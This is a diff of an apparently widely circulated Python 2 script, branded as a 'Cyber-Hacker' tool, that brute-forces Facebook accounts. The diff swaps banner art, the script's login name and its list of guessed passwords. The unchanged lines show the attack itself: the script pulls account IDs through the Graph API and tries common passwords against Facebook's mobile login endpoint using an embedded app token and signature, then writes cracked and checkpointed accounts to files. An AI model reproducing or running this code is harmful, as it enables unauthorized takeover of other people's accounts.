@@ -48,12 +48,12 @@ def jalan(z):
 
 #### LOGO ####
 logo = """
-\033[1;39m╭━━━┳╮╱╱╱╱╭╮╱╱╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╭━━━╮╱╭╮╱╱╱╱╭╮
-\033[1;32m┃╭━╮┃┃╱╱╱╱┃┃╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱┃╭━╮┃╱┃┃╱╱╱╱┃┃
-\033[1;33m┃╰━━┫╰━┳━━┫╰━┳━━━┳━━┳━╯┣━━╮╱╱┃┃╱┃┣━┫╰━┳━━┫╰━╮
+\033[1;91m╭━━━┳╮╱╱╱╱╭╮╱╱╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╭━━━╮╱╭╮╱╱╱╱╭╮
+\033[1;92m┃╭━╮┃┃╱╱╱╱┃┃╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱┃╭━╮┃╱┃┃╱╱╱╱┃┃
+\033[1;31m┃╰━━┫╰━┳━━┫╰━┳━━━┳━━┳━╯┣━━╮╱╱┃┃╱┃┣━┫╰━┳━━┫╰━╮
 \033[1;36m╰━━╮┃╭╮┃╭╮┃╭╮┣━━┃┃╭╮┃╭╮┃╭╮┣━━┫╰━╯┃╭┫╭╮┃╭╮┃╭╮┃
-\033[1;35m┃╰━╯┃┃┃┃╭╮┃┃┃┃┃━━┫╭╮┃╰╯┃╭╮┣━━┫╭━╮┃┃┃╰╯┃╭╮┃╰╯┃
-\033[1;38m╰━━━┻╯╰┻╯╰┻╯╰┻━━━┻╯╰┻━━┻╯╰╯╱╱╰╯╱╰┻╯╰━━┻╯╰┻━━╯
+\033[1;95m┃╰━╯┃┃┃┃╭╮┃┃┃┃┃━━┫╭╮┃╰╯┃╭╮┣━━┫╭━╮┃┃┃╰╯┃╭╮┃╰╯┃
+\033[1;93m╰━━━┻╯╰┻╯╰┻╯╰┻━━━┻╯╰┻━━┻╯╰╯╱╱╰╯╱╰┻╯╰━━┻╯╰┻━━╯
 \033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤═══║
 \033[1;96m║✯ CREATOR ✯ ARBAB ALI MEMON            ║    
 \033[1;98m║✯ CYBER-HACKER-PLAYER 1.0287           ║  
@@ -81,15 +81,17 @@ print  """
 \033[1;97m************************************************
 
  
+\033[1;91m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╱╭━━━━╮
+\033[1;91m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱╱┃╭╮╭╮┃
+\033[1;91m╰╮╰╯╭┻━┳╮╭┳━╮╭━━╮╱╰╯┃┃┣╋━━┳━━┳━╮
+\033[1;91m╱╰╮╭┫╭╮┃┃┃┃╭╮┫╭╮┣━━╮┃┃┣┫╭╮┃┃━┫╭╯
+\033[1;91m╱╱┃┃┃╰╯┃╰╯┃┃┃┃╰╯┣━━╯┃┃┃┃╰╯┃┃━┫┃
+\033[1;91m╱╱╰╯╰━━┻━━┻╯╰┻━╮┃╱╱╱╰╯╰┻━╮┣━━┻╯
+\033[1;91m╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃╱╱╱╱╱╱╭━╯┃
+╱╱╱╱╱╱\033[1;91m╱╱╱╱╱╱╱╰━━╯╱╱╱╱╱╱╰━━╯
+"""
 
-\033[1;91m╭━━╮╱╱╱╱╱╱╱╱╱╱╭━━━╮╭╮╱╭╮╱╱╱╱╱╱╭╮
-\033[1;92m╰┫┣╯╱╱╱╱╱╱╱╱╱╱┃╭━╮┣╯╰┳╯╰╮╱╱╱╱╱┃┃
-\033[1;93m╱┃┃╭━┳━━┳━╮╱╱╱┃┃╱┃┣╮╭┻╮╭╋━━┳━━┫┃╭╮
-\033[1;94m╱┃┃┃╭┫╭╮┃╭╮┳━━┫╰━╯┃┃┃╱┃┃┃╭╮┃╭━┫╰╯╯
-\033[1;95m╭┫┣┫┃┃╭╮┃┃┃┣━━┫╭━╮┃┃╰╮┃╰┫╭╮┃╰━┫╭╮╮
-\033[1;96m╰━━┻╯╰╯╰┻╯╰╯╱╱╰╯╱╰╯╰━╯╰━┻╯╰┻━━┻╯╰╯
-
-CorrectUsername = "Iran"
+CorrectUsername = "YoungTiger"
 CorrectPassword = "Arbab"
 loop = 'true'
 while (loop == 'true'):
@@ -297,7 +299,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Arbab
+			pass #Dev:rana
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
@@ -345,7 +347,7 @@ def pilih_super():
 				               cek.close()
 				               cekpoint.append(user+pass2)								
 				           else:											
-					       pass3 = 'Iran1234'									
+					       pass3 = '786000'									
 					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
 					       q = json.load(data)										
 					       if 'access_token' in q:	
@@ -367,7 +369,7 @@ def pilih_super():
 				                           cek.close()
 				                           cekpoint.append(user+pass3)									
 					               else:										
-						           pass4 = 'Iranlove'										
+						           pass4 = '000786'										
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
 			                                   if 'access_token' in q:		
@@ -389,7 +391,7 @@ def pilih_super():
 				                                       cek.close()
 				                                       cekpoint.append(user+pass4)					
 					                           else:									
-						                       pass5 = 'Iran12345'							
+						                       pass5 = '786786'							
 						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 						                       q = json.load(data)								
 						                       if 'access_token' in q:	
@@ -411,7 +413,7 @@ def pilih_super():
 				                                                   cek.close()
 				                                                   cekpoint.append(user+pass5)					
 						                               else:								
-							                           pass6 = 'Iran123'											
+							                           pass6 = 'Pakistan'											
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
 			                                                           if 'access_token' in q:	
@@ -510,7 +512,7 @@ def pilih_super():
 	print "  \033[1;91m«---•◈•---Developed By CyberHacker-Arbab--•◈•---»" #Dev:Arbab
 	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 Arbab.py)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
-	print"
+	print """
 
 
 ░█████╗░██████╗░██████╗░░█████╗░██████╗░
@@ -527,11 +529,8 @@ def pilih_super():
                 Facebook
               \033[1;91mCYBER-HACKER-SHAHZADA-ARBAB"""
 	
-	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	menu()
 
 if __name__ == '__main__':
 	login()
-
-	
